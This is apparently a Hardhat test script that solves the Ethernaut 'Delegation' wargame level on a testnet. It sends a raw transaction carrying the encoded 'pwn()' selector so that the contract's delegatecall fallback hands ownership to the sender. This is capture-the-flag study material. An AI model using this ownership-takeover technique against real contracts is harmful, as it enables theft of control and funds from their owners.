import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Update to match the target contract
  const challengeFactory = await ethers.getContractFactory(`Delegation`);
  // The below address comes from Ethernaut deployed on Rinkeby
  // Go to https://ethernaut.openzeppelin.com/, select a Level, grab address
  // from the URL
  const challengeAddress = await createChallenge(
    `0x9451961b7Aea1Df57bc20CC68D72f662241b5493`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
    // computes the first four bytes of the function signature
    // so that we can correctly pass it as the value in `data` .
    const iface = new ethers.utils.Interface(["function pwn()"]);
    const data = iface.encodeFunctionData("pwn");

    tx = await eoa.sendTransaction({
        from: eoa.getAddress(),
        to: challenge.address,
        data: data,
        gasLimit: ethers.BigNumber.from(`100000`)
    });
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
